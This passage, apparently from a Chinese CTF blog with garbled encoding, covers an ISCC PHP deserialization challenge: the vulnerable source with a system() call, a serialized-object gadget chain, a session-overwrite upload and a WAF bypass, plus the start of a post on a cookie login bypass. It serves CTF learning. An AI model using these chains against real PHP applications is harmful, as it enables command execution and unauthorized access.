die(&quot;æ‰€ä»¥å“ªä¸ªISCCæ˜¯çœŸçš„ï¼Ÿ&lt;br&gt;&quot;);&#125;if(isset($_GET[&#x27;?&#x27;])) &#123; $wtf = waf($_GET&#123;&#x27;?&#x27;&#125;) ? $_GET[&#x27;?&#x27;] : (finalize() &amp;&amp; die(&quot;è¯•è¯•å°±â€œé€ä¸–â€!&quot;)); if($goodshit = @unserialize($wtf)) &#123; $is_unser_finished = true; &#125; if(in_array($status, array(&#x27;new&#x27;, &#x27;cmd&#x27;, &#x27;upload_ok&#x27;, &#x27;upload_fail&#x27;, &#x27;reset&#x27;), true)) finalize(); die(&quot;æ‰€ä»¥å“ªä¸ªISCCæ˜¯çœŸçš„ï¼Ÿ&lt;br&gt;&quot;);&#125;?&gt;&lt;head&gt; &lt;title&gt;ISCC finder system - which is the true ISCC&lt;/title&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;style&gt; * &#123; margin: 0; padding: 0; &#125; canvas &#123; display: block; &#125; #snowfall &#123; width: 100%; height: 100vh; background: cornflowerblue; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;!--â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’--&gt;&lt;script src=&quot;//cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js&quot;&gt;&lt;/script&gt;&lt;div id=&quot;snowfall&quot;&gt;&lt;/div&gt;&lt;script&gt; particlesJS(&quot;snowfall&quot;, &#123; &quot;particles&quot;: &#123; &quot;number&quot;: &#123; &quot;value&quot;: 100 &#125;, &quot;shape&quot;: &#123; &quot;type&quot;: &quot;circle&quot; &#125;, &quot;size&quot;: &#123; &quot;value&quot;: 10, &quot;random&quot;: true &#125;, &quot;line_linked&quot;: &#123; &quot;enable&quot;: false &#125;, &quot;move&quot;: &#123; &quot;enable&quot;: true, &quot;speed&quot;: 2, &quot;direction&quot;: &quot;bottom&quot;, &quot;straight&quot;: false &#125; &#125;, &quot;interactivity&quot;: &#123; &quot;detect_on&quot;: &quot;canvas&quot;, &quot;events&quot;: &#123; &quot;onhover&quot;: &#123; &quot;enable&quot;: false &#125; &#125;, &quot;modes&quot;: &#123; &quot;push&quot;: &#123; &quot;particles_nb&quot;: 12 &#125; &#125; &#125; &#125;);&lt;/script&gt;&lt;!--&lt;a href=&quot;/?whatareyounongshane=src&quot;&gt;æˆ‘çœŸçš„æ˜¯æºç ?&lt;/a&gt;&lt;a href=&quot;/?whatareyounongshane=cmd&quot;&gt;å¹²ç‚¹å¥½äº‹!&lt;/a&gt;&lt;a href=&quot;/?whatareyounongshane=upload&quot;&gt;é€ç‚¹ä¸œè¥¿!&lt;/a&gt;&lt;a href=&quot;/?whatareyounongshane=tellmetruth&quot;&gt;å¿«å‘Šè¯‰æˆ‘çœŸç›¸!&lt;/a&gt;--&gt;&lt;/body&gt;æ‰€ä»¥å“ªä¸ªISCCæ˜¯çœŸçš„ï¼Ÿ ç„¶åèƒ½æ”¯ç¦»ç ´ç¢çš„æŠŠæ¯ä¸€å¤„çš„é—®é¢˜è§£å†³ï¼Œæ¯”å¦‚sessionå˜é‡è¦†ç›–isccIsCciScc1sccï¼Œä½†æ˜¯æˆ‘å´æ‰¾ä¸åˆ°æ€ä¹ˆæŠŠä»–ä»¬ç©¿èµ·æ¥ï¼Œåæ¥é—®äº†å¸¦å¸ˆå‚…æ‰çŸ¥é“åŸæ¥å¯ä»¥å¼ºè¡Œçš„æŠŠä»–ä»¬ç©¿èµ·æ¥,payloadï¼š 12345678$cmd = new ISCC_ResetCMD();$upload = new ISCC_Upload();$tellme = new ISCC_TellMeTruth();$com = new ISCC_Command();$upload-&gt;staasdtus = $cmd;$cmd-&gt;is_upload = $tellme;$cmd-&gt;status = $com; å¯ä»¥çœ‹è§uploadè¿™ä¸ªç±»æ˜¯æ²¡æœ‰æˆ‘éšä¾¿å†™çš„è¿™ä¸ªå±æ€§çš„ï¼Œä½†æ˜¯ä¾ç„¶ä¸å½±å“æˆ‘ä»¬è¿›è¡Œæ“ä½œï¼Œdestructå’Œ wakeupä¾ç„¶ä¼šæ‰§è¡Œï¼Œæ—¢ç„¶çŸ¥é“è¿™ä¸ªçŸ¥è¯†ç‚¹é‚£ä¹ˆå°±å¾ˆç®€å•äº†ï¼Œç›´æ¥æŠŠä»–ä»¬è¿èµ·æ¥å°±å¯ä»¥äº† æ€è·¯: ä¿®æ”¹session-&gt;æ§åˆ¶cmd-&gt;æ‰§è¡Œ å›¾ç‰‡ä¸Šä¼ çš„æ—¶å€™åŒæ—¶å†ç©¿ä¸€ä¸ªtextä¸Šå» 12345------WebKitFormBoundaryANIrb3jmbjSiBlbnContent-Disposition: form-data; name&#x3D;&quot;_SESSION&quot;; filename&#x3D;&quot;isccIsCciScc1scc&quot;Content-Type: text&#x2F;plainwdnmd 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285&lt;?phpsession_start();ini_set(&#x27;max_execution_time&#x27;, &#x27;5&#x27;);set_time_limit(5);$status = &quot;new&quot;;$cmd = &quot;whoami&quot;;$is_upload = false;$is_unser_finished = false;$iscc_file = NULL;class ISCC_Upload &#123; function __wakeup() &#123; global $cmd; global $is_upload; $cmd = &quot;whoami&quot;; $_SESSION[&#x27;name&#x27;] = randstr(14); $is_upload = (count($_FILES) &gt; 0); &#125; function __destruct() &#123; global $is_upload; global $status; global $iscc_file; $status = &quot;upload_fail&quot;; if ($is_upload) &#123; foreach ($_FILES as $key =&gt; $value) $GLOBALS[$key] = $value; if(is_uploaded_file($iscc_file[&#x27;tmp_name&#x27;])) &#123; $check = @getimagesize($iscc_file[&quot;tmp_name&quot;]); if($check !== false) &#123; $target_dir = &quot;/var/tmp/&quot;; $target_file = $target_dir . randstr(10); if (file_exists($target_file)) &#123; echo &quot;æƒ³å•¥å‘¢ï¼Ÿæœ‰ä¸œè¥¿äº†â€¦â€¦&lt;br&gt;&quot;; finalize(); exit; &#125; if ($iscc_file[&quot;size&quot;] &gt; 500000) &#123; echo &quot;ä¸œè¥¿å¡ä¸è¿›å»~&lt;br&gt;&quot;; finalize(); exit; &#125; if (move_uploaded_file($iscc_file[&quot;tmp_name&quot;], $target_file)) &#123; echo &quot;æˆ‘æ‹¿åˆ°äº†ï¼&lt;br&gt;&quot;; $iscc_file = $target_file; $status = &quot;upload_ok&quot;; &#125; else &#123; echo &quot;æ‹¿ä¸åˆ°:(&lt;br&gt;&quot;; finalize(); exit; &#125; &#125; else &#123; finalize(); exit; &#125; &#125; else &#123; echo &quot;ä½ çœŸæ˜¯ä¸ªå¤©æ‰!&lt;br&gt;&quot;; finalize(); exit; &#125; &#125; &#125;&#125;class ISCC_ResetCMD &#123; protected $new_cmd=&quot;ls&quot;; function __wakeup() &#123; global $cmd; global $is_upload; global $status; $_SESSION[&#x27;name&#x27;] = randstr(14); $is_upload = false;//O:11:&quot;ISCC_Upload&quot;:1:&#123;s:6:&quot;status&quot;;O:13:&quot;ISCC_ResetCMD&quot;:3:&#123;S:10:&quot;\\00\\2A\\00new_cmd&quot;;s:2:&quot;ls&quot;;s:9:&quot;is_upload&quot;;O:16:&quot;ISCC_TellMeTruth&quot;:0:&#123;&#125;s:6:&quot;status&quot;;O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#125;&#125;//O:11:&quot;ISCC_Upload&quot;:1:&#123;s:6:&quot;status&quot;;O:13:&quot;ISCC_ResetCMD&quot;:3:&#123;S:10:&quot;\\00\\2A\\00new_cmd&quot;;s:6:&quot;whoami&quot;;s:9:&quot;is_upload&quot;;O:16:&quot;ISCC_TellMeTruth&quot;:0:&#123;&#125;s:6:&quot;status&quot;;O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#125;&#125; if(!isset($this-&gt;new_cmd)) &#123;// phpinfo(); $status = &quot;error&quot;; $error = &quot;ä½ è¿™ç½å­æ˜¯ç©ºçš„!&quot;; throw new Exception($error); &#125; if(!is_string($this-&gt;new_cmd)) &#123; $status = &quot;error&quot;; $error = &#x27;ä¸œè¥¿éƒ½æ²¡ç»™å¯¹!&#x27;; throw new Exception($error); &#125; &#125; function __destruct() &#123; global $cmd; global $status; $status = &quot;reset&quot;; if($_SESSION[&#x27;name&#x27;] === &#x27;isccIsCciScc1scc&#x27;) &#123; $cmd = $this-&gt;new_cmd; &#125; &#125;&#125;class ISCC_Login &#123; function __wakeup() &#123;// phpinfo(); $this-&gt;login(); &#125; function __destruct() &#123;// phpinfo(); $this-&gt;logout(); &#125; function login() &#123;// phpinfo(); $flag = file_get_contents(&quot;/flag&quot;); $pAssM0rd = hash(&quot;sha256&quot;, $flag); if($_GET[&#x27;pAssM0rd&#x27;] === $pAssM0rd) $_SESSION[&#x27;name&#x27;] = &quot;isccIsCciScc1scc&quot;; &#125; function logout() &#123; global $status; unset($_SESSION[&#x27;name&#x27;]); $status = &quot;finish&quot;; &#125;&#125;class ISCC_TellMeTruth &#123; function __wakeup() &#123; if(!isset($_SESSION[&#x27;name&#x27;])) $_SESSION[&#x27;name&#x27;] = randstr(14); echo &quot;ä¼¼ä¹è¿™ä¸ª &quot;.$_SESSION[&#x27;name&#x27;].&quot; æ˜¯çœŸç›¸&lt;br&gt;&quot;; &#125; function __destruct() &#123; echo &quot;ä¼¼ä¹è¿™ä¸ª &quot;.$_SESSION[&#x27;name&#x27;].&quot; æ˜¯çœŸç›¸&lt;br&gt;&quot;; &#125;&#125;class ISCC_Command &#123; function __wakeup() &#123; global $cmd; global $is_upload; $_SESSION[&#x27;name&#x27;] = randstr(14); $is_upload = false; $cmd = &quot;whoami&quot;; &#125; function __toString() &#123; global $cmd; return &quot;çœ‹çœ‹ä½ å¹²çš„å¥½äº‹: &#123;$cmd&#125; &lt;br&gt;&quot;; &#125; function __destruct() &#123; global $cmd; global $status; global $is_unser_finished; $status = &quot;cmd&quot;; if($is_unser_finished === true) &#123; echo &quot;çœ‹çœ‹ä½ å¹²çš„ [&lt;span style=&#x27;color:red&#x27;&gt;&#123;$cmd&#125;&lt;/span&gt;] å¼„å‡ºäº†ä»€ä¹ˆåæœ: &quot;; echo &quot;&lt;span style=&#x27;color:blue&#x27;&gt;&quot;; @system($cmd); echo &quot;&lt;/span&gt;&quot;; &#125; &#125;&#125;function randstr($len)&#123; $characters = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_=&#x27;; $randstring = &#x27;&#x27;; for ($i = 0; $i &lt; $len; $i++) &#123; $randstring .= $characters[rand(0, strlen($characters))]; &#125; return $randstring;&#125;function waf($s) &#123;// phpinfo(); if(stripos($s, &quot;*&quot;) !== FALSE)// phpinfo(); return false;// phpinfo(); return true;&#125;function finalize() &#123; $cmd = &quot;&quot;; $is_upload = false; unset($_SESSION); @unlink($iscc_file); $status = &quot;finish&quot;; echo &quot;nonono&quot;;&#125;if(isset($_GET[&#x27;whatareyounongshane&#x27;])) &#123; $whatareyounongshane = $_GET[&#x27;whatareyounongshane&#x27;]; switch ($whatareyounongshane) &#123; case &quot;src&quot;: highlight_file(__FILE__); break; case &quot;cmd&quot;: echo &quot;æƒ³è¶Šçº§å¹²å¥½äº‹ï¼Ÿè¿˜æ˜¯æœ‰é—¨çš„â€¦â€¦&quot;; header(&#x27;Location: /?%3f=O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#x27;); break; case &quot;reset&quot;: echo &quot;å‡ è¾ˆå­ç§¯ç´¯çš„å¥½è¿å°±åœ¨è¿™æ—¶~:p&quot;; header(&#x27;Location: /?%3f=O:13:&quot;ISCC_ResetCMD&quot;:1:&#123;&#125;&#x27;); break; case &quot;upload&quot;: $resp = &lt;&lt;&lt;EOF&lt;form action=&quot;/index.php?%3f=O:11:%22ISCC_Upload%22:0:&#123;&#125;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;iscc_file&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Upload Image&quot; name=&quot;submit&quot;&gt;&lt;/form&gt;EOF; echo $resp; break; case &quot;tellmetruth&quot;: echo base64_decode(&quot;PGltZyBzcmM9J3RlbGxtZXRydXRoLmdpZic+Cg==&quot;); header(&#x27;Location: /?%3f=O:14:&quot;ISCC_TellMeTruth&quot;:0:&#123;&#125;&#x27;); break; default: echo &quot;ç©ºç©ºå¦‚ä¹Ÿå°±æ˜¯æˆ‘ï¼&quot;; &#125; finalize(); die(&quot;æ‰€ä»¥å“ªä¸ªISCCæ˜¯çœŸçš„ï¼Ÿ&lt;br&gt;&quot;);&#125;$cmd = new ISCC_ResetCMD();$upload = new ISCC_Upload();$tellme = new ISCC_TellMeTruth();$com = new ISCC_Command();$upload-&gt;staasdtus = $cmd;$cmd-&gt;is_upload = $tellme;$cmd-&gt;status = $com;echo(serialize($upload));//O:11:&quot;ISCC_Upload&quot;:1:&#123;s:9:&quot;staasdtus&quot;;O:13:&quot;ISCC_ResetCMD&quot;:2:&#123;s:10:&quot;\\00\\2A\\00new_cmd&quot;;s:2:&quot;ls&quot;;s:6:&quot;status&quot;;O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#125;&#125;//O:11:&quot;ISCC_Upload&quot;:1:&#123;s:9:&quot;staasdtus&quot;;O:13:&quot;ISCC_ResetCMD&quot;:3:&#123;S:10:&quot;\\00\\2A\\00new_cmd&quot;;s:2:&quot;ls&quot;;s:9:&quot;is_upload&quot;;O:16:&quot;ISCC_TellMeTruth&quot;:0:&#123;&#125;s:6:&quot;status&quot;;O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#125;&#125;//O:11:&quot;ISCC_Upload&quot;:1:&#123;s:6:&quot;status&quot;;O:13:&quot;ISCC_ResetCMD&quot;:3:&#123;S:10:&quot;\\00\\2A\\00new_cmd&quot;;s:2:&quot;ls&quot;;s:9:&quot;is_upload&quot;;O:16:&quot;ISCC_TellMeTruth&quot;:0:&#123;&#125;s:6:&quot;status&quot;;O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#125;&#125;if(($a)) &#123; $wtf = waf($a) ? $a : (finalize() &amp;&amp; die(&quot;è¯•è¯•å°±â€œé€ä¸–â€!&quot;));// phpinfo();// echo $wtf; if($goodshit = @unserialize($wtf)) &#123;// phpinfo(); $is_unser_finished = true;// var_dump($is_unser_finished); &#125;// phpinfo();// var_dump(unserialize(&quot;O:11:\\&quot;ISCC_Upload\\&quot;:1:&#123;s:6:\\&quot;status\\&quot;;O:13:\\&quot;ISCC_ResetCMD\\&quot;:3:&#123;S:10:\\&quot;\\00\\2A\\00new_cmd\\&quot;;s:6:\\&quot;whoami\\&quot;;s:9:\\&quot;is_upload\\&quot;;O:16:\\&quot;ISCC_TellMeTruth\\&quot;:0:&#123;&#125;s:6:\\&quot;status\\&quot;;O:12:\\&quot;ISCC_Command\\&quot;:0:&#123;&#125;&#125;&#125;&quot;)); var_dump($status); if(in_array($status, array(&#x27;new&#x27;, &#x27;cmd&#x27;, &#x27;upload_ok&#x27;, &#x27;upload_fail&#x27;, &#x27;reset&#x27;), true)) finalize();// phpinfo(); die(&quot;\\næ‰€ä»¥å“ªä¸ªISCCæ˜¯çœŸçš„ï¼Ÿ&quot;);&#125;?&gt; ç»•è¿‡ * æ“ä½œï¼š 12345å½“PHPååºåˆ—åŒ–çš„sæ¢æˆSçš„æ—¶å€™å°±å¯ä»¥æ˜¯ç”¨åå…­è¿›åˆ¶æ¥æ“ä½œ~O:11:&quot;ISCC_Upload&quot;:1:&#123;s:9:&quot;staasdtus&quot;;O:13:&quot;ISCC_ResetCMD&quot;:3:&#123;s:10:&quot; * new_cmd&quot;;s:2:&quot;ls&quot;;s:9:&quot;is_upload&quot;;O:16:&quot;ISCC_TellMeTruth&quot;:0:&#123;&#125;s:6:&quot;status&quot;;O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#125;&#125;O:11:&quot;ISCC_Upload&quot;:1:&#123;s:6:&quot;status&quot;;O:13:&quot;ISCC_ResetCMD&quot;:3:&#123;S:10:&quot;\\00\\2A\\00new_cmd&quot;;s:2:&quot;ls&quot;;s:9:&quot;is_upload&quot;;O:16:&quot;ISCC_TellMeTruth&quot;:0:&#123;&#125;s:6:&quot;status&quot;;O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#125;&#125;","categories":[],"tags":[{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"},{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"2020æå®¢å¤§æŒ‘æˆ˜","slug":"2020æå®¢å¤§æŒ‘æˆ˜","date":"2021-04-27T05:50:31.000Z","updated":"2021-05-03T04:53:17.963Z","comments":true,"path":"2021/04/27/2020æå®¢å¤§æŒ‘æˆ˜/","link":"","permalink":"http://example.com/2021/04/27/2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/","excerpt":"","text":"Roamphp2-Myblogå…ˆæ˜¯ä¼ªåè®®åˆ°å¤„è¯»æ–‡ä»¶.. åˆ†åˆ«èƒ½è¯»åˆ°home.php,login.php,secret.phpï¼Œç„¶ååœ¨login.phpä¸‹çœ‹htmlèƒ½è¯»åˆ°/admin/user.php æ„Ÿè§‰åƒæ˜¯ä¼ªéšæœºæ•°çˆ†ç ´.. å®¡è®¡ä»£ç åå‘ç°å…¶å®æ˜¯å¯ä»¥ç»•è¿‡çš„ï¼Œå› ä¸ºåˆ¤æ–­ä¸­å¯¹$_SESSIONpasswordè¿›è¡Œäº†å¯¹æ¯”ï¼Œå¦‚æœæƒ³è¦ç»•è¿‡çš„è¯å°†ä¸¤è€…éƒ½æ˜¯ä½œä¸ºç©ºå³å¯ æ•…æˆ‘ä»¬ç›´æ¥æ„é€ payload 123cookies:username&#x3D;Longlone&amp;password&#x3D; ç™»é™†ä¸Šä¹‹åå°±å¯ä»¥æ‰¾åˆ°ä¸Šä¼ ç‚¹ï¼Œç»™å‡ºäº†æºç ï¼š 